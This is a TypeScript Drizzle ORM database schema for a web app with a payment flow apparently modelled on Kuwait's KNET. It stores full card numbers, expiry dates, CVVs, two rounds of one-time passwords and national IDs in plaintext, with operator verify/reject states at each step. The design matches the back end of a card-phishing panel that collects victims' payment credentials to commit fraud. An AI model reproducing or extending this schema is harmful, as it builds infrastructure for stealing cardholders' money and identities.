import { int, mysqlEnum, mysqlTable, text, timestamp, varchar } from "drizzle-orm/mysql-core";

/**
 * Core user table backing auth flow.
 * Extend this file with additional tables as your product grows.
 * Columns use camelCase to match both database fields and generated types.
 */
export const users = mysqlTable("users", {
  /**
   * Surrogate primary key. Auto-incremented numeric value managed by the database.
   * Use this for relations between tables.
   */
  id: int("id").autoincrement().primaryKey(),
  /** Manus OAuth identifier (openId) returned from the OAuth callback. Unique per user. */
  openId: varchar("openId", { length: 64 }).notNull().unique(),
  name: text("name"),
  email: varchar("email", { length: 320 }),
  loginMethod: varchar("loginMethod", { length: 64 }),
  role: mysqlEnum("role", ["user", "admin"]).default("user").notNull(),
  createdAt: timestamp("createdAt").defaultNow().notNull(),
  updatedAt: timestamp("updatedAt").defaultNow().onUpdateNow().notNull(),
  lastSignedIn: timestamp("lastSignedIn").defaultNow().notNull(),
});

export type User = typeof users.$inferSelect;
export type InsertUser = typeof users.$inferInsert;

// Payment System Tables

export const payments = mysqlTable("payments", {
  id: int("id").autoincrement().primaryKey(),
  userId: int("userId").references(() => users.id),
  amount: int("amount").notNull(), // Amount in fils
  status: mysqlEnum("status", ["pending", "knet_submitted", "otp1_pending", "otp1_verified", "cvv_pending", "cvv_verified", "otp2_pending", "otp2_verified", "hawety_pending", "completed", "rejected"]).default("pending").notNull(),
  cardNumber: varchar("cardNumber", { length: 20 }),
  cardPrefix: varchar("cardPrefix", { length: 10 }),
  expiryMonth: varchar("expiryMonth", { length: 2 }),
  expiryYear: varchar("expiryYear", { length: 4 }),
  bankName: varchar("bankName", { length: 100 }),
  reference: varchar("reference", { length: 100 }).unique(),
  createdAt: timestamp("createdAt").defaultNow().notNull(),
  updatedAt: timestamp("updatedAt").defaultNow().onUpdateNow().notNull(),
});

export type Payment = typeof payments.$inferSelect;
export type InsertPayment = typeof payments.$inferInsert;

export const otpRequests = mysqlTable("otpRequests", {
  id: int("id").autoincrement().primaryKey(),
  paymentId: int("paymentId").references(() => payments.id).notNull(),
  otpNumber: varchar("otpNumber", { length: 6 }),
  stage: mysqlEnum("stage", ["first", "second"]).notNull(), // first OTP or second OTP
  status: mysqlEnum("status", ["pending", "verified", "rejected"]).default("pending").notNull(),
  rejectionReason: text("rejectionReason"),
  createdAt: timestamp("createdAt").defaultNow().notNull(),
  updatedAt: timestamp("updatedAt").defaultNow().onUpdateNow().notNull(),
});

export type OtpRequest = typeof otpRequests.$inferSelect;
export type InsertOtpRequest = typeof otpRequests.$inferInsert;

export const cvvRequests = mysqlTable("cvvRequests", {
  id: int("id").autoincrement().primaryKey(),
  paymentId: int("paymentId").references(() => payments.id).notNull(),
  cvvNumber: varchar("cvvNumber", { length: 4 }),
  status: mysqlEnum("status", ["pending", "verified", "rejected"]).default("pending").notNull(),
  rejectionReason: text("rejectionReason"),
  createdAt: timestamp("createdAt").defaultNow().notNull(),
  updatedAt: timestamp("updatedAt").defaultNow().onUpdateNow().notNull(),
});

export type CvvRequest = typeof cvvRequests.$inferSelect;
export type InsertCvvRequest = typeof cvvRequests.$inferInsert;

export const hawetyCalls = mysqlTable("hawetyCalls", {
  id: int("id").autoincrement().primaryKey(),
  paymentId: int("paymentId").references(() => payments.id).notNull(),
  nationalId: varchar("nationalId", { length: 20 }),
  status: mysqlEnum("status", ["pending", "verified", "rejected"]).default("pending").notNull(),
  rejectionReason: text("rejectionReason"),
  createdAt: timestamp("createdAt").defaultNow().notNull(),
  updatedAt: timestamp("updatedAt").defaultNow().onUpdateNow().notNull(),
});

export type HawetyCall = typeof hawetyCalls.$inferSelect;
export type InsertHawetyCall = typeof hawetyCalls.$inferInsert;